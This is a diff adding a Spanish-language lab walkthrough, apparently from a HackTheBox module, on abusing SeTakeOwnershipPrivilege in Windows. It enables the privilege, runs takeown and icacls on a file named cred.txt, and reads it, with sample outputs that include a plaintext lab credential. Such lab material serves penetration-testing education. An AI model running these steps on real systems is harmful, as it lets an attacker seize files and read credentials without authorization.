@@ -41,3 +41,164 @@ Si detectamos un usuario que posee este privilegio —o si logramos asignárselo
 * **Facilitar RCE** en casos donde la manipulación de un ejecutable/servicio permita ejecutar código con mayor privilegio.
 
 
+---
+
+# Uso de SeTakeOwnershipPrivilege — Flujo detallado
+
+Este lienzo explica paso a paso cómo revisar y aprovechar el privilegio **SeTakeOwnershipPrivilege** para tomar la propiedad de un fichero y leerlo (solo en entornos autorizados / laboratorio). Incluye comandos, salidas de ejemplo y recomendaciones de cuidado y remediación.
+
+---
+
+## 1) Revisar privilegios del usuario actual
+
+Primero comprobamos los privilegios del token de la sesión actual:
+
+```powershell
+# Mostrar privilegios del token
+whoami /priv
+```
+
+**Salida de ejemplo (parcial):**
+
+```
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                              State
+============================= ======================================== =======
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
+```
+
+Si el privilegio aparece como `Disabled`, lo podemos habilitar en nuestro token para la sesión actual.
+
+---
+
+## 2) Habilitar `SeTakeOwnershipPrivilege` en el token
+
+Una forma sencilla en laboratorio es cargar un script que active privilegios en el token (ej.: `Enable-Privilege.ps1` y `EnableAllTokenPrivs.ps1`).
+
+```powershell
+# Importar y ejecutar scripts que habilitan privilegios en el token
+Import-Module .\Enable-Privilege.ps1
+.\EnableAllTokenPrivs.ps1
+
+# Verificamos de nuevo
+whoami /priv
+```
+
+**Salida de ejemplo (parcial) tras habilitar:**
+
+```
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
+```
+
+> **Nota:** esos scripts deben emplearse solo en entornos de prueba o con autorización. En producción la elevación arbitraria de privilegios está prohibida.
+
+---
+
+## 3) Elegir un fichero objetivo y recopilar información
+
+Localiza un fichero interesante en el recurso compartido o en el disco. En el ejemplo se eligió `C:\Department Shares\Private\IT\cred.txt`.
+
+Comprobamos detalles del fichero (nombre completo, fechas, atributos y owner):
+
+```powershell
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | \
+  Select Fullname,LastWriteTime,Attributes,@{Name='Owner';Expression={ (Get-Acl $_.FullName).Owner }}
+```
+
+Si no aparece el `Owner` (o la consulta falla por permisos), retrocede y mira el propietario del directorio:
+
+```powershell
+# Mostrar owner de la carpeta con cmd (ejemplo)
+cmd /c dir /q 'C:\Department Shares\Private\IT'
+```
+
+**Salida de ejemplo:**
+
+```
+ Directory of C:\Department Shares\Private\IT
+
+06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
+06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
+06/18/2021  12:23 PM                36 ...                    cred.txt
+```
+
+En este ejemplo la carpeta está bajo la propiedad de la cuenta `WINLPE-SRV01\sccm_svc` y contiene `cred.txt`.
+
+---
+
+## 4) Tomar la propiedad del fichero
+
+Si nuestro token tiene el privilegio habilitado, podemos ejecutar `takeown` para cambiar la propiedad del archivo al usuario actual.
+
+```powershell
+# Tomar propiedad del archivo
+takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+```
+
+**Salida de ejemplo:**
+
+```
+SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
+```
+
+Confirmamos que ahora somos propietarios:
+
+```powershell
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | \
+  select name,directory,@{Name='Owner';Expression={(Get-ACL $_.Fullname).Owner}}
+```
+
+**Salida de ejemplo:**
+
+```
+Name     Directory                       Owner
+----     ---------                       -----
+cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
+```
+
+---
+
+## 5) Modificar la ACL del fichero para conceder permisos de lectura
+
+Ser propietario no siempre implica tener permisos efectivos de lectura. Tras tomar ownership, usamos `icacls` para darnos control total (Full Control):
+
+```powershell
+icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+```
+
+**Salida de ejemplo:**
+
+```
+processed file: C:\Department Shares\Private\IT\cred.txt
+Successfully processed 1 files; Failed processing 0 files
+```
+
+---
+
+## 6) Leer el fichero
+
+Si todo ha funcionado, ahora podemos leer el fichero:
+
+```powershell
+Get-Content 'C:\Department Shares\Private\IT\cred.txt'
+```
+
+**Salida de ejemplo:**
+
+```
+NIX01 admin
+
+root:n1X_p0wer_us3er!
+```
+
+> **Atención:** este contenido puede contener credenciales reales. Solo manejarlo según el alcance del engagement y las reglas del cliente.
+
+---
+
+
